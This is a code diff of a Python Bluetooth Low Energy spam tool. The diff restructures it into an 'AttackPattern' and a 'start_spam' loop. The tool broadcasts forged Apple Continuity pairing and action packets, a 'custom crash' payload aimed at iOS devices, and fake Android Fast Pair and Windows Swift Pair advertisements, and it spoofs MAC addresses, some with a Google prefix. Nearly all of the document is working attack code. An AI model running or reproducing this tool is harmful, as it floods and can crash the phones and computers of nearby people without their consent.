@@ -2,6 +2,8 @@
 # Github: https://github.com/ECTO-1A
 
 # Based on the previous work of chipik / _hexway
+from dataclasses import dataclass
+from pprint import pprint
 import random
 import argparse
 from time import sleep
@@ -159,7 +161,7 @@ hex_data = {
 }
 
 
-def make_packet(packet_type: ContinuityType, *, model: int = 0, action: int = 0) -> tuple[Sequence[int], int]:
+def make_packet_apple(packet_type: ContinuityType, *, model: int = 0, action: int = 0) -> tuple[Sequence[int], int]:
     if model == 0:
         model = random.choice(list(pp_models.values()))
     if action == 0:
@@ -358,22 +360,20 @@ def make_packet_windows(packet_type: SwiftPairType = SwiftPairType.BREDROnly, *,
     return packet, size
 
 
-def make_proximity_pair_data(option: int) -> Sequence[int]:
-    name = bt_data_options[option]
-    model = pp_models[name]
-    packet, size = make_packet(ContinuityType.ProximityPair, model=model)
+def make_proximity_pair_data(device_name: str) -> Sequence[int]:
+    model = pp_models[device_name]
+    packet, size = make_packet_apple(ContinuityType.ProximityPair, model=model)
     return packet
 
 
-def make_nearby_action_data(option: int) -> Sequence[int]:
-    name = bt_data_options[option]
+def make_nearby_action_data(name: str) -> Sequence[int]:
     model = na_actions[name]
-    packet, size = make_packet(ContinuityType.NearbyAction, model=model)
+    packet, size = make_packet_apple(ContinuityType.NearbyAction, model=model)
     return packet
 
 
 def make_custom_crash_data() -> Sequence[int]:
-    packet, size = make_packet(ContinuityType.CustomCrash)
+    packet, size = make_packet_apple(ContinuityType.CustomCrash)
     return packet
 
 
@@ -384,7 +384,7 @@ def make_custom_crash_data() -> Sequence[int]:
 # exit()
 
 
-def get_bt_data(option: int) -> Sequence[int] | None:
+def make_apple_data(option: int) -> Sequence[int] | None:
     bt_data = hex_data.get(option)
 
     if not bt_data:
@@ -393,116 +393,165 @@ def get_bt_data(option: int) -> Sequence[int] | None:
     if "AirPods" not in name and "Beats" not in name:
         return bt_data
 
-    return make_proximity_pair_data(option)
+    return make_proximity_pair_data(name)
+
+
+class SpamTarget(Enum):
+    random = auto()  # All except CustomCrash and Windows (WIP)
+    IOS = auto()
+    Android = auto()
+    Windows = auto()
+    IOSCustomCrash = auto()
+
+
+@dataclass
+class AttackPattern():
+    dev_id: int
+    interval: int
+    adv_time: float
+    random_mac: bool
+    random_adv: bool
+    spam_data: list
+    spam_target: SpamTarget
+    permanent: bool
+
+
+def start_spam(sock, *, pattern: AttackPattern) -> None:
+    spam_data = random.choice(pattern.spam_data) if pattern.spam_data else ""
+    match pattern.spam_target:
+        case SpamTarget.random:
+            pattern.spam_target = random.choice(
+                [
+                    SpamTarget.IOS,
+                    SpamTarget.Android,
+                ]
+            )
+            return start_spam(sock, pattern=pattern)
+        case SpamTarget.IOS:
+            if spam_data:
+                if spam_data.isalnum():
+                    selected_option = int(spam_data)
+                    if not 1 <= selected_option <= len(bt_data_options):
+                        message = (
+                            "Invalid data option: {selected_option}"
+                            + "\nAvailable data options:"
+                        )
+                        for option, description in bt_data_options.items():
+                            message += f"\n{option}: {description}"
+                        raise ValueError(message)
+                else:
+                    try:
+                        selected_option = list(bt_data_options.keys())[
+                            [
+                                _.lower() for _ in bt_data_options.values()
+                            ].index(spam_data.lower())
+                        ]
+                    except ValueError as e:
+                        message = (
+                            f"Invalid device name: {spam_data}"
+                            + "\nAvailable device names:"
+                        )
+                        for device_name in bt_data_options.values():
+                            message += f"\n{device_name}"
+                        raise ValueError(message) from e
+            else:
+                selected_option = random.choice(list(bt_data_options.keys()))
+            bt_data = make_apple_data(selected_option)
+        case SpamTarget.Android:
+            bt_data, *_ = make_packet_android(model=(int(spam_data, 16) if spam_data.isalnum() else 0))
+        case SpamTarget.Windows:
+            bt_data, *_ = make_packet_windows(name=spam_data)
+        case SpamTarget.IOSCustomCrash:
+            bt_data = make_custom_crash_data()
+        case _:
+            return
+
+    if pattern.random_mac:
+        random_mac = ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])
+
+        # TODO check if specific mac matter
+        if pattern.spam_target in [SpamTarget.Android, SpamTarget.Windows ]:
+            random_mac = f"d4:3a:2c:{random_mac[9:]}"  # google mac prefix
+
+        change_internal_mac_addr(sock, random_mac)
+
+    # TODO check if 0x01, 0x02, 0x04 are valid ones (especially 0x01 and 0x04)
+    # ADV_IND = 0x00
+    # ADV_DIRECT_IND = 0x01
+    # ADV_SCAN_IND = 0x02
+    # ADV_NONCONN_IND = 0x03
+    # ADV_SCAN_RSP = 0x04
+    # adv_type = args.random_adv and random.randint(0x01,0x04) or 0x03
+    adv_type = pattern.random_adv and random.randint(0x02,0x03) or 0x03
+
+    start_le_advertising(sock, adv_type=adv_type, min_interval=pattern.interval, max_interval=pattern.interval, data=bt_data)
+    while True:
+        sleep(pattern.adv_time)
+        if not pattern.permanent:
+            break
+    stop_le_advertising(sock)
 
 
 def main():
     parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
     parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval (default 200))')
     parser.add_argument('-t', '--adv-time', default=2.0, type=float, help='Advertising time (default 2))')
-    parser.add_argument('-d', '--data', type=int, help='Select a message to send (e.g., -d 1)')
     parser.add_argument('-b', '--bt-dev-id', default=0, type=int, help='Bluetooth device ID (default 0)')
-    parser.add_argument('--device-name', type=str, help='Specify a device name (e.g., --device-name "AirPods Pro")')
+    parser.add_argument('-d', '--data', type=str,
+                        help='Select a message or device name to send (e.g., \'-d 1\' or \'-d "AirPods Pro"\') (can be splitted by , for multiple)')
 
-    # Add random argument
-    parser.add_argument('-r', '--random', action='store_true', help='Randomly loop through advertising data')
+    # Behavior
+    parser.add_argument('-r', '--random', action='store_true', help='Randomly loop through advertising data (default) (also, forces random mac (random adv is WIP)))')
+    parser.add_argument('--repeat', action='store_true', help='Infinitely repeat specified advertising data, without re-enabling')
+
+    # Targets
     parser.add_argument('-c', '--custom-crash', action='store_true', help='Use custom crash method by @ECTO-1A')
-    parser.add_argument('-a', '--android', action='store_true', help='Android BLE spam')
+    parser.add_argument('-ap', '--apple', action='store_true', help='Apple BLE spam')
+    parser.add_argument('-an', '--android', action='store_true', help='Android BLE spam')
     parser.add_argument('-w', '--windows', action='store_true', help='Windows BLE spam')
-    parser.add_argument('--windows-text', default="", type=str, help='Windows BLE spam text (leave blank to use names.txt file or default values from flipper firmware)')
 
-    parser.add_argument('--random-mac', action='store_true', help='Randomly select mac address if -r, -c or -a specified')
-    parser.add_argument('--random-adv', action='store_true', help='Randomly select advertisement event types if -r, -c or -a specified')
+    # Randomization
+    parser.add_argument('--random-mac', action='store_true', help='Randomly select mac address')
+    parser.add_argument('--random-adv', action='store_true', help='Randomly select advertisement event types')
 
     args = parser.parse_args()
 
-    if (args.data is None) and (args.device_name is None) and not args.random and not args.custom_crash and not args.android and not args.windows:
-        print("Please select a message option using -d or --device-name. Use --random for random selection.")
-        print("Available message options and device names:")
-        for option, description in bt_data_options.items():
-            print(f"{option}: {description}")
-        return
-
-    if args.data and args.data not in bt_data_options:
-        print(f"Invalid data option: {args.data}")
-        print("Available data options:")
-        for option, description in bt_data_options.items():
-            print(f"{option}: {description}")
-        return
-
-    if args.device_name and args.device_name.lower() not in [_.lower() for _ in bt_data_options.values()]:
-        print(f"Invalid device name: {args.device_name}")
-        print("Available device names:")
-        for device_name in bt_data_options.values():
-            print(device_name)
-        return
+    spam_target = (
+        SpamTarget.IOS if args.apple else
+        SpamTarget.Android if args.android else
+        SpamTarget.Windows if args.windows else
+        SpamTarget.IOSCustomCrash if args.custom_crash else
+        SpamTarget.random)
+    attack_pattern = AttackPattern(
+        dev_id=args.bt_dev_id,
+        interval=args.interval,
+        adv_time=args.adv_time,
+        random_mac=True if SpamTarget.random else args.random_mac,
+        random_adv=args.random_adv,
+        spam_data=args.data.split(",") if args.data else [],
+        spam_target=spam_target,
+        permanent=args.repeat,
+        # permanent=hasattr(args, "data"),  # TODO
+    )
+    pprint(attack_pattern)
 
     # the default Bluetooth device is hci0
-    dev_id = args.bt_dev_id
-    toggle_device(dev_id, True)
+    toggle_device(attack_pattern.dev_id, True)
 
     try:
-        sock = bluez.hci_open_dev(dev_id)
-        if args.random_mac:
-            original_mac = get_internal_mac_addr(dev_id)
+        sock = bluez.hci_open_dev(attack_pattern.dev_id)
+        if args.random or args.random_mac:
+            original_mac = get_internal_mac_addr(attack_pattern.dev_id)
             print(f"Your original mac address is {original_mac}\nIt will restored after you stop the script\n")
     except Exception as e:
-        print(f"Unable to connect to Bluetooth hardware {dev_id}: {e}")
+        print(f"Unable to connect to Bluetooth hardware {attack_pattern.dev_id}: {e}")
         return
 
     print("Advertising Started... Press Ctrl+C to Stop")
 
     try:
-        if args.windows:
-            while True:
-                bt_data, *_ = make_packet_windows(name=args.windows_text)
-                print(bt_data)
-                # adv_type = args.random_adv and random.randint(0x01,0x04) or 0x03  # TODO check valid ones
-                adv_type = args.random_adv and random.randint(0x02,0x03) or 0x03
-                if args.random_mac:
-                    random_mac = ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])
-                    change_internal_mac_addr(sock, random_mac)
-                start_le_advertising(sock, adv_type=adv_type, min_interval=args.interval, max_interval=args.interval, data=bt_data)
-                sleep(args.adv_time)
-                stop_le_advertising(sock)
-        if args.android:
-            while True:
-                bt_data, *_ = make_packet_android()
-                adv_type = args.random_adv and random.randint(0x02,0x03) or 0x03
-                if args.random_mac:
-                    random_mac = ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])
-                    random_mac = f"d4:3a:2c:{random_mac[9:]}"  # google mac prefix
-                    change_internal_mac_addr(sock, random_mac)
-                start_le_advertising(sock, adv_type=adv_type, min_interval=args.interval, max_interval=args.interval, data=bt_data)
-                sleep(args.adv_time)
-                stop_le_advertising(sock)
-        elif args.custom_crash:
-            while True:
-                bt_data = make_custom_crash_data()
-                adv_type = args.random_adv and random.randint(0x01,0x04) or 0x03  # TODO check valid ones
-                if args.random_mac:
-                    random_mac = ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])
-                    change_internal_mac_addr(sock, random_mac)
-                start_le_advertising(sock, adv_type=adv_type, min_interval=args.interval, max_interval=args.interval, data=bt_data)
-                sleep(args.adv_time)
-                stop_le_advertising(sock)
-        elif args.random:
-            while True:
-                selected_option = random.choice(list(bt_data_options.keys()))
-                bt_data = get_bt_data(selected_option)
-                adv_type = args.random_adv and random.randint(0x01,0x04) or 0x03  # TODO check valid ones
-                if args.random_mac:
-                    random_mac = ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])
-                    change_internal_mac_addr(sock, random_mac)
-                start_le_advertising(sock, adv_type=adv_type, min_interval=args.interval, max_interval=args.interval, data=bt_data)
-                sleep(args.adv_time)
-                stop_le_advertising(sock)
-        else:
-            selected_option = args.data or list(bt_data_options.keys())[[_.lower() for _ in bt_data_options.values()].index(args.device_name.lower())]
-            bt_data = get_bt_data(selected_option)
-            start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval, data=bt_data)
-            while True:
-                sleep(args.adv_time)
+        while True:
+            start_spam(sock, pattern=attack_pattern)
     except KeyboardInterrupt:
         stop_le_advertising(sock)
     except Exception as e:
